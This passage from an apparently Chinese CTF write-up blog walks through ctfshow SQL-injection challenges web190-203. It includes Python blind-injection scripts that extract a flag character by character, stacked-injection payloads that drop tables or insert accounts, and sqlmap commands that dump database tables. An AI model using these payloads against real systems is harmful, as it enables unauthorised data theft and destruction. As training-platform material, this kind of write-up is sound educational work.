-*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://1429d815-6439-47de-ab04-5782a8bbf349.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h2><p>源码</p><p><img src="../images/image-20221230205641079.png" alt="image-20221230205641079"></p><p>这题相较上题而言，增加了过滤。但是影响不大，把web190的脚本拿来修改一下就好了。</p><p><img src="../images/image-20221230210418369.png" alt="image-20221230210418369"></p><p>这两个函数是一样的，可以替换着来用</p><p>修改后的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-12 05:48:30</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://86c12830-4c24-41b4-bf71-64e3ad3646d1.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">127</span></span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = (<span class="built_in">max</span>+<span class="built_in">min</span>)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">min</span> == mid):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and (ord(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = mid</span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;77de2af3-6f34-4d20-adc7-8aba40a40ffe&#125;</span></span><br></pre></td></tr></table></figure><p>利用ord()来替换。</p><h2 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h2><p>源码</p><p><img src="../images/image-20221230212728629.png" alt="image-20221230212728629"></p><p>这里是把ord和ascii都给过滤掉了，那么我们就可以考虑不用编码成数字的形式来解题，可以直接遍历字符串来看是否相等。</p><p>群主写的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 00:52:03</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://053d8c7a-d802-48ae-836c-d60f4a832555.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_fl0g</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h2><p>源码</p><p><img src="../images/image-20221230214618742.png" alt="image-20221230214618742"></p><p>这次193是把substr给过滤掉了，那么我们就可以靠用别的函数来替代了。</p><p>left   right 这两个函数都可以。</p><p><img src="../images/image-20221230215436224.png" alt="image-20221230215436224"></p><p><img src="../images/image-20221230215458982.png" alt="image-20221230215458982"></p><p>群主写的wp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cd09c29e-5dfa-4740-aae6-babe6eebb972.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((left((select f1ag from ctfshow_flxg),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><p>这里用tempstr参数的原因是，left函数不能一个一个的遍历，这个函数是直接输出长度为多少的字符串，所以我们得找一个参数来暂时存起来，然后在和新的拼接在一起。</p><h2 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h2><p>源码</p><p><img src="../images/image-20221230220314140.png" alt="image-20221230220314140"></p><p>过滤了挺多东西的。这道题可以使用   lpad   函数</p><p><img src="../images/image-20221230220532917.png" alt="image-20221230220532917"></p><p><img src="../images/image-20221230220638283.png" alt="image-20221230220638283"></p><p>其实和left差不多，只是加了一个空命令。</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: k1he</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-18 21:01:32</span></span><br><span class="line"><span class="comment"># @Last Modified by:   k1he</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-01-14 01:24:27</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ae098689-0aa3-490f-9ece-da1a4ef3eaa4.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">&quot;,_&#125;&#123;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line">tempstr = <span class="string">&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#ctfshow_flxg</span></span><br><span class="line">        <span class="comment">#payload = &quot;admin&#x27;and ((left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;)=&#x27;&#123;&#125;&#x27;))#&quot;.format(i,tempstr+mid)</span></span><br><span class="line">        <span class="comment">#id,f1ag</span></span><br><span class="line">        payload = <span class="string">&quot;admin&#x27;and ((lpad((select f1ag from ctfshow_flxg),&#123;&#125;,&#x27;&#x27;)=&#x27;&#123;&#125;&#x27;))#&quot;</span>.<span class="built_in">format</span>(i,tempstr+mid)</span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#&#123;&#x27;username&#x27;: &quot;admin&#x27;and ((substr((select f1ag from ctfshow_fl0g),1,1)=&#x27;O&#x27;))#&quot;, &#x27;password&#x27;: 0&#125;</span></span><br><span class="line">        res = requests.post(url = url,data =data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> res.text.find(<span class="string">&quot;8bef&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            tempstr += mid</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++++++&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ctfshow&#123;2bc86f71-2a58-45b2-8573-940ddffa99d2&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web195-堆叠注入"><a href="#web195-堆叠注入" class="headerlink" title="web195(堆叠注入)"></a>web195(堆叠注入)</h2><p>源码</p><p><img src="../images/image-20221230225635015.png" alt="image-20221230225635015"></p><p>这道题用的是堆叠注入的知识点。</p><p><img src="../images/image-20221230225706757.png" alt="image-20221230225706757"></p><p>wp是利用update函数来更新数据库里的密码。</p><p><img src="../images/image-20221230225901741.png" alt="image-20221230225901741"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">``      这个符号可以替代空格。</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221230230250480.png" alt="image-20221230230250480"></p><h2 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h2><p>源码</p><p><img src="../images/image-20221230230414378.png" alt="image-20221230230414378"></p><p><img src="../images/image-20221230231811538.png" alt="image-20221230231811538"></p><p><img src="../images/image-20221230231833992.png" alt="image-20221230231833992"></p><p>通过这一点可以来进行判断。</p><p><img src="../images/image-20221230231919859.png" alt="image-20221230231919859"></p><p>这里的select并没有被过滤。</p><p><img src="../images/image-20221231004615102.png" alt="image-20221231004615102"></p><h2 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h2><p>源码</p><p><img src="../images/image-20221230232106140.png" alt="image-20221230232106140"></p><p>不能用update来更新密码了。</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0;drop table ctfshow_user;</span><br><span class="line">create table ctfshow_user(`username` varchar(100),`pass` varchar(100));</span><br><span class="line">insert ctfshow_user(`username`,`pass`) value(1,2);</span><br></pre></td></tr></table></figure><p>这是先删除掉原来的表，然后在新建一个表，然后在往表里插入东西。</p><p><img src="../images/image-20221230235928061.png" alt="image-20221230235928061"></p><p><img src="../images/image-20221230235936942.png" alt="image-20221230235936942"></p><p>成功执行并且建立了新表和内容。</p><p><img src="../images/image-20221231000026235.png" alt="image-20221231000026235"></p><p>成功执行。</p><h2 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h2><p>源码</p><p><img src="../images/image-20221231000119082.png" alt="image-20221231000119082"></p><p>新建表和更新密码都不能用了。</p><p><strong>解法一</strong></p><p>paylaod</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;insert ctfshow_user(`username`,`pass`) value(2,3);</span><br></pre></td></tr></table></figure><p>通过新插入的账号密码来获得flag。</p><p>然后在username和password处分别输入2，3    就能拿到flag。</p><p><strong>解法二</strong></p><p>通过pass和id列的互相交换，然后把依次爆破pass就好了，username值填0；（弱类型比较）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column `pass` `tmp` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `tmp` `id` varchar(255)</span><br></pre></td></tr></table></figure><h2 id="web199"><a href="#web199" class="headerlink" title="web199"></a>web199</h2><p>源码</p><p><img src="../images/image-20221231003923901.png" alt="image-20221231003923901"></p><p>这道题的用法类似这个原理</p><p><img src="../images/image-20221231004703865.png" alt="image-20221231004703865"></p><p><strong>解法一</strong></p><p><img src="../images/image-20221231004751742.png" alt="image-20221231004751742"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username  ---&gt;    1;show tables</span><br><span class="line">password  ---&gt;    ctfshow_user</span><br><span class="line">因为就是$row是用来存第二个分号后传的内容的</span><br></pre></td></tr></table></figure><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><p>这个是把varchar类型换成text类型，因为就是varchar需要括号，text不需要括号。</p><p>然后username为0；从0开始爆破password就行。</p><h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><p>源码</p><p> <img src="../images/image-20221231005222484.png" alt="image-20221231005222484"></p><p>多把一个逗号给过滤掉了。</p><p><strong>解法一</strong></p><p><img src="../images/image-20221231005325134.png" alt="image-20221231005325134"></p><p><strong>解法二</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change column id pass int;alter table ctfshow_user change column tmp id text</span><br></pre></td></tr></table></figure><h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><p>源码</p><p><img src="../images/image-20221231212254050.png" alt="image-20221231212254050"></p><p><strong>第一步</strong></p><p>查看是否可以进行注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213608213.png" alt="image-20221231213608213"></p><p>说明id可以进行注入了。</p><p><strong>第二步</strong></p><p>查找全部的数据库名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show --dbs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213740070.png" alt="image-20221231213740070"></p><p><strong>第三步</strong></p><p>查找某个数据库中的表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web --tables</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231213901166.png" alt="image-20221231213901166"></p><p><strong>第四步</strong></p><p>查找表中的所有的列名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214110487.png" alt="image-20221231214110487"></p><p><strong>第五步</strong></p><p>查看这些列中的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://1bb5bf5b-d162-49e5-b701-e4eb8c3e851e.challenge.ctf.show/api/?id=&quot; --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231214230587.png" alt="image-20221231214230587"></p><p>拿到flag.</p><h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><p>源码</p><p><img src="../images/image-20221231214436334.png" alt="image-20221231214436334"></p><p>那就是POST请求了。</p><p><img src="../images/image-20221231214624767.png" alt="image-20221231214624767"></p><p>猜测数据库名和表名也该没改，那么直接就去用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://f61fc87c-d4f4-44bb-a391-52a88766edb9.challenge.ctf.show/api/&quot; --data=&quot;id=1&quot; --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221231215653269.png" alt="image-20221231215653269"></p><p>直接拿到flag.</p><h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><p>源码</p><p><img src="../images/image-20221231215842405.png" alt="image-20221231215842405"></p><p>这题说是要用method。</p><p><img src="../images/image-20221231215938860.png" alt="image-20221231215938860"></p><p>注意：一定要加上–headers=“Content-Type: text/plain” ，否则是按表单提交的，put接收不到</p><p>payload</p><figure class="highlight 